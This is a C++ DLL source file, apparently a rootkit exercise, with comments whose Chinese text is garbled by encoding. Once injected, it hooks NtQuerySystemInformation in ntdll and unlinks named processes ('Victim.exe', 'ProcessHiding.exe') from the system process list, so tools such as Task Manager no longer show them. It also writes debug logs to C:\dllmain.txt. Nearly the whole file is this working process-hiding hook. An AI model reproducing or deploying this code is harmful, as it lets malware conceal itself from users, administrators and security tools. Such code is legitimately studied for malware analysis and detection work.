// dllmain.cpp : ���� DLL Ӧ�ó������ڵ㡣
#include "stdafx.h"
#include "hookFunc.h"
#include "SysInfo.h"


#include <stdio.h>
#include <iostream>
#include<stdlib.h>

#include <tlhelp32.h>
#include <iostream>
#include <set>
#include <array>

#include <io.h>
#include <conio.h>
#include <fstream>

using namespace std;

//д��־
ofstream infile;


char* filename = "C:\\dllmain.txt";

//��������

int (WINAPI *pRealAPIentry)();


__kernel_entry NTSTATUS NTAPI hookNtQuerySystemInformation(
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	OUT PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength OPTIONAL);

DWORD GetProcessId(WCHAR *wProcessName);


//DLL�ļ��������
BOOL APIENTRY DllMain(
	HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
		//����ӳ��
	case DLL_PROCESS_ATTACH:
		//�������й���ͬʱд��־
		infile.open(filename);

		//��hookNtQuerySystemInformation()�滻NtQuerySystemInformation()
		if (InstallHook("ntdll.dll", "NtQuerySystemInformation",
			(void*)hookNtQuerySystemInformation,
			(void**)(&pRealAPIentry))
			)
		{
			//ִ�гɹ�
			infile << "\n\nNtQuerySystemInformation Hook installed!\n\n" << endl;
		}
		else
		{
			//ִ�в��ɹ�
			infile << "\n\nFailed to install hook NtQuerySystemInformation!\n\n" << endl;

		}

		break;

	case DLL_THREAD_ATTACH:
		break;

	case DLL_THREAD_DETACH:
		break;

	case DLL_PROCESS_DETACH://����ж��ʱ�ر���־
		infile.close();

		break;
	}
	return TRUE;
}


__kernel_entry NTSTATUS NTAPI hookNtQuerySystemInformation(
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	OUT PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength OPTIONAL)
{

	//��ȡNtQuerySystemInformation���ڵ�dll�ļ����
	HMODULE hNtDll = GetModuleHandle(L"ntdll.dll");
	infile << "ntdll�����" << hNtDll << endl;

	if (!hNtDll)
		return NULL;

	//��ȡNtQuerySystemInformation�ĺ�����ַ������һ��ʱ����
	NTQUERYSYSTEMINFORMATION NtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)GetProcAddress(hNtDll, "NtQuerySystemInformation");

	infile << "\nȡ��ַNtQuerySystemInformation��" << NtQuerySystemInformation << endl;

	//ʵ��ϵͳ����NtQuerySystemInformation������¼����ֵ
	NTSTATUS org = NtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

	infile << "\n org:" << org << endl;

	//����ָ��Ժ������ص���Ϣ���д���
	PSYSTEM_PROCESS_INFORMATION pInfo = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
	PSYSTEM_PROCESS_INFORMATION pInfobefore = pInfo;

	infile << "\n���� \n\tSystemInformationClass\t " << SystemInformationClass << "\n\tSystemInformation\t" << SystemInformation << endl;


	if (SystemInformationClass == SystemProcessInformation)
	{//����ǰ�����ϵͳ��Ϣ������ϵͳ������Ϣ�ࣨ5��

		WCHAR wProcessName[100] = L"Victim.exe";
		WCHAR wProcessName1[100] = L"ProcessHiding.exe";
		//�˴���Ǳ����صĽ��������磺
		//L"ProcessHiding.exe";
		//L"calc.exe";
		//L"notepad.exe";
		//���ú�����ý���ID
		DWORD dwPID = GetProcessId(wProcessName);
		DWORD dwPID1 = GetProcessId(wProcessName1);
		while (pInfo)
		{
			if ((pInfo->ProcessId == dwPID && dwPID != 0) || (pInfo->ProcessId == dwPID1 && dwPID1 != 0))
			{//�ҵ���Ҫ�����ص�������Ϣ
				infile << "\npInfo:\n\tNextEntryDelta\t" << pInfo->NextEntryDelta << "\n\tProcessId\t" << pInfo->ProcessId << "\n\tProcessName\t" << pInfo->ProcessName.Buffer << endl;

				infile << "\n\n***********\nFind " << pInfo->ProcessId << " !!!!\n*********\n\n" << endl;

				//�޸���������ǰ�������
				//ʵ��ԭ����ǰ���ĵ�ַ + ���ƫ���� = ��һ�����ĵ�ַ
				//����Ҫ������ǰ�����Ҫ����һ������ƫ�����ı䣬ʹ��ָ����һ�����
				//����һ������ƫ����=��һ������ƫ����+��ǰ����ƫ����
				pInfobefore->NextEntryDelta += pInfo->NextEntryDelta;



				//�ҵ���һ�������Ϣ
				pInfo = (PSYSTEM_PROCESS_INFORMATION)(((PUCHAR)pInfo) + pInfo->NextEntryDelta);

			}
			else
			{
				infile << "\npInfo:\n\tNextEntryDelta\t" << pInfo->NextEntryDelta << "\n\tProcessId\t" << pInfo->ProcessId << "\n\tProcessName\t" << pInfo->ProcessName.Buffer << endl;
				pInfobefore = pInfo;

				if (pInfo->NextEntryDelta == 0)
				{//�жϵ�ǰ����Ƿ���ĩβ��㣬���ǣ��򽫱��ָ���ÿ�
					infile << "\n%%%%%%%%pInfo:Last!!!" << endl;
					pInfo = NULL;
				}
				else
				{//�����ҵ���һ�������Ϣ
					pInfo = (PSYSTEM_PROCESS_INFORMATION)(((PUCHAR)pInfo) + pInfo->NextEntryDelta);
				}
			}
			

		}
	}

	infile << "\n\n ok return." << endl;

	return org;

}


DWORD GetProcessId(WCHAR *wProcessName)
{//�ӽ�������ȡ����ID

	//Get first process in list
	HANDLE hProcessSnap = NULL;

	PROCESSENTRY32 peProcess = { 0 };//NULL�����ϸ�ʽ

	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{//INVALID_HANDLE_VALUEΪHANDLE����Чֵ
		infile << "Unable to get process list " << GetLastError() << endl;
		return 0;
	}

	peProcess.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(hProcessSnap, &peProcess))
	{
		do
		{
			if (wcscmp(peProcess.szExeFile, wProcessName) == 0)
			{
				infile << "\n=========Read PID." << peProcess.th32ProcessID << endl;
				return peProcess.th32ProcessID;
			}
		} while (Process32Next(hProcessSnap, &peProcess));
	}

	infile << L"\n Process '%s' not found!\n" << wProcessName << endl;
	return 0;

}